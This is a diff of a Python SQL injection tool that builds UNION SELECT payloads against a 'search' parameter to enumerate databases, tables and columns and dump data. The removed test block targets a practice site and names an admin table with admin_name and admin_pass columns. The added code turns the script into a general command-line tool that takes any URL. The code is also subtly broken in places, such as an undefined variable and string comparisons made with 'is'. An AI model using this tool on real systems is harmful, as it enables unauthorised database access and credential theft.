@@ -5,39 +5,7 @@
 
 import requests
 import re
-import sys
-
-# Define
-# fieldNum = 0
-# url = sys.argv[1].split("?")[0]
-# db = sys.argv[2]
-# table = sys.argv[3]
-# columns = sys.argv[4]
-
-#########  test  ########################################
-db = 'zvuldrill'                                       ##
-table = 'admin'                                        ##
-columns = ['admin_name', 'admin_pass']                 ##
-url =  'http://www.zvuldrill.com/ZVulDrill/search.php' ##
-#########################################################
-
-def main(url):
-    printJB()
-    fieldNum = getMess(url)
-    print(fieldNum)
-    dbList = getDb(fieldNum)
-    print(dbList)
-    tableList = getTable(fieldNum,db)
-    print(tableList)
-    # tableList和选择的table注意区分
-    columnsList = getColumn(fieldNum,db,table)
-    print(columnsList)
-    # columnsList和选择的columns注意区分
-    dataList = getData(fieldNum,db,table,columns)
-    print(dataList)
-
-def controller():
-    pass
+import argparse
 
 def printJB():
     print(
@@ -51,6 +19,77 @@ def printJB():
 
     '''
     )
+
+def getParams():
+    parser = argparse.ArgumentParser(description='XJBN')
+
+    # url
+    parser.add_argument('-u', '--url', type=str, help='input your url')
+    # database
+    parser.add_argument('-d', '--database', type=str, default=None,help='input your database')
+    # table
+    parser.add_argument('-t', '--table', type=str, default=None,help='input your table')
+    # columns (return list)
+    parser.add_argument('-c', '--columns', type=str, default=None,nargs='+', help='input your columns')
+
+    args = parser.parse_args()
+
+    return args.url,args.database,args.table,args.columns
+
+
+def controller(url,database,table,columns):
+    if url is not None:
+        fieldNum = getMess(url)
+        if fieldNum is 0:
+            dataPrint("fail")
+        else:
+            dataPrint(fieldNum)
+            dbList = getDb(fieldNum)
+            dataPrint(dbList)
+    else:
+        dataPrint("null")
+        return
+
+    if database is not None:
+        tableList = getTable(fieldNum,db)
+        if tableList is 0:
+            dataPrint("fail")
+        else:
+            dataPrint(tableList)
+    else:
+        dataPrint("null")
+        return
+
+    if table is not None:
+        columnsList = getColumn(fieldNum,db,table)
+        if columnsList is 0:
+            dataPrint("fail")
+        else:
+            dataPrint(columnsList)
+    else:
+        dataPrint("null")
+        return
+
+    if columns is not None:
+        dataList = getData(fieldNum, db, table, columns)
+        if dataList is 0:
+            dataPrint("fail")
+        else:
+            dataPrint(dataList)
+    else:
+        dataPrint("null")
+        return
+
+
+# more fish but i like
+def dataPrint(data):
+    if data is "fail":
+        print("fail")
+    elif data is "null":
+        print("----------------stop----------------")
+    else:
+        print(data)
+
 
 def messSplit(data):
     match = {'database': '', 'user': '', 'version': ''}
@@ -91,6 +130,8 @@ def getMess(url):
             getMessCharPayload = "%' union select " + fieldLen + " # "
             getMessCharParams = {'search': getMessCharPayload}
 
+    return 0
+
 def getDb(fieldNum):
     getDbCharPayload = "%' union select "
     for i in range(1, fieldNum):
@@ -108,6 +149,8 @@ def getDb(fieldNum):
     match = list(set(match))
     if (match != None):
         return match
+
+    return 0
 
 
 def getTable(fieldNum,db):
@@ -128,6 +171,8 @@ def getTable(fieldNum,db):
     if (match != None):
         return match
 
+    return 0
+
 
 def getColumn(fieldNum,db,table):
     getColumnsCharPayload = "%' union select "
@@ -145,6 +190,8 @@ def getColumn(fieldNum,db,table):
     match = list(set(match))
     if (match != None):
         return match
+
+    return 0
 
 
 def getData(fieldNum,db,table,columns):
@@ -173,6 +220,14 @@ def getData(fieldNum,db,table,columns):
     if (match != None):
         return match
 
+    return 0
+
+
+def main(url,database,table,columns):
+    controller(url,database,table,columns)
+
 
 if __name__ == "__main__":
-    main(url)
+    printJB()
+    url,db,table,columns = getParams()
+    main(url,db,table,columns)
